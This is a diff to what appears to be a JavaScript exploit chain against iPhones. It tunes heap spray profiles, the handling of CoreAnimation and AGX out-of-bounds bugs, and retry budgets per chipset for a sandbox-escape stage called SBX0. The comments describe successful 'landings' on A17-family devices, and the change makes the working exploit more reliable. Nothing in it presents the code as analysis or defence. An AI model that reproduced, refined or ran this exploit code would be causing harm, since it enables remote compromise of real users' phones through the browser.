@@ -7113,18 +7113,24 @@
     "22f32fd975a694d340a6ad22b872b1ae": spray_profiles.wide
   };
   const chipset_fallback_profile_sequences = {
-    // This A17/A17 Pro family hash regularly survives cleanly with the
-    // compact layouts but becomes much less stable once wide profiles are
-    // attempted or once we retry inside the same dirty WebContent process.
+    // Recent repro logs for this A17/A17 Pro family hash only produced real
+    // SBX0 landings on the compact layout. compact_alt_fill tends to finish
+    // the CA OOB but collapse in iterativeRead(), while the wider layouts
+    // destabilize much earlier. Pin fresh runs to compact and only use
+    // retry-budget tuning to decide whether we reattempt inside the same
+    // WebContent lifetime.
     "c33e4990a9d3afe948b98d7d4205d596": [
-      spray_profiles.compact,
-      spray_profiles.compact_alt_fill
+      spray_profiles.compact
     ]
   };
   const chipset_inprocess_attempt_budget = {
-    // Keep one CA OOB attempt per WebContent lifetime and rotate profiles
-    // across fresh runs via the persisted fallback-start index instead.
-    "c33e4990a9d3afe948b98d7d4205d596": 1
+    // Allow one extra fresh-GPU retry when AGX dies early, but bail
+    // immediately once we've dirtied the CA leak path in this process.
+    "c33e4990a9d3afe948b98d7d4205d596": {
+      default: 1,
+      "agx oob failed": 2,
+      "coreanimation oob failed": 1
+    }
   };
   const fallback_spray_profiles = [
     spray_profiles.compact,
@@ -7141,15 +7147,25 @@
   function currentExploitAttemptCount() {
     return Math.max(0, retry_count - 1);
   }
-  function shouldAbortInProcessRetry() {
+  function currentInProcessAttemptBudget(reason) {
+    if (chipset_spray_profile[chipset]) return Infinity;
+    const budget = chipset_inprocess_attempt_budget[chipset];
+    if (!budget) return Infinity;
+    if (typeof budget === 'number') return budget;
+    if (reason && isFinite(budget[reason])) return budget[reason];
+    if (isFinite(budget.default)) return budget.default;
+    return Infinity;
+  }
+  function shouldAbortInProcessRetry(reason) {
     if (chipset_spray_profile[chipset]) return false;
-    const max_attempts = chipset_inprocess_attempt_budget[chipset];
+    const max_attempts = currentInProcessAttemptBudget(reason);
     if (!isFinite(max_attempts)) return false;
     return currentExploitAttemptCount() >= max_attempts;
   }
   function abortInProcessRetry(reason) {
     const attempts = currentExploitAttemptCount();
-    LOG(`[x] ${reason}; aborting in-process retries after ${attempts}/${chipset_inprocess_attempt_budget[chipset]} attempt(s)`);
+    const max_attempts = currentInProcessAttemptBudget(reason);
+    LOG(`[x] ${reason}; aborting in-process retries after ${attempts}/${max_attempts} attempt(s)`);
     throw new Error(`SBX0 retry budget exhausted: ${reason}`);
   }
   (function SBX0() {
@@ -7579,7 +7595,7 @@
       fcall(offsets.pthread_setspecific, runLoopHolder_tid, 0n);
     }
     function respawn_gpu_process_and_retry(reason = 'retry requested') {
-      if (shouldAbortInProcessRetry()) {
+      if (shouldAbortInProcessRetry(reason)) {
         abortInProcessRetry(reason);
       }
       LOG(`[-] going to respawn gpu process`);
